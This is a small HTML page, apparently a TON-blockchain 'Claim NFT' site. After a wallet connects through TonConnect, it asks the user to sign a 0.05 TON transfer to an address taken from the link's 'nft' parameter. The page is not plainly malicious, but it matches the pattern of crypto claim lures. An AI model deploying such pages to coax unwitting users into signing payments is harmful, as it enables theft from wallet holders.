<!DOCTYPE html>
<html>
<head>
    <title>Claim</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">

    <h1>Claim System</h1>
    <div id="ton-connect-button" style="margin-bottom:20px;"></div>
    
    <button id="claim-btn" style="padding:20px; font-size:20px; background:red;">CLAIM NFT</button>

    <script>
        const tonConnectUI = new TonConnectUI({
            manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        document.getElementById('claim-btn').onclick = async () => {
            if (!tonConnectUI.connected) {
                alert("Сначала подключи кошелек через кнопку выше!");
                return;
            }

            try {
                const params = new URLSearchParams(window.location.search);
                const nft = params.get('nft');
                
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 360,
                    messages: [{
                        address: nft,
                        amount: '50000000',
                        payload: 'te6cckEBAQEAAgAAAEAw'
                    }]
                };
                
                await tonConnectUI.sendTransaction(transaction);
            } catch (e) {
                alert("Ошибка: " + e.message);
            }
        };
    </script>
</body>
</html>
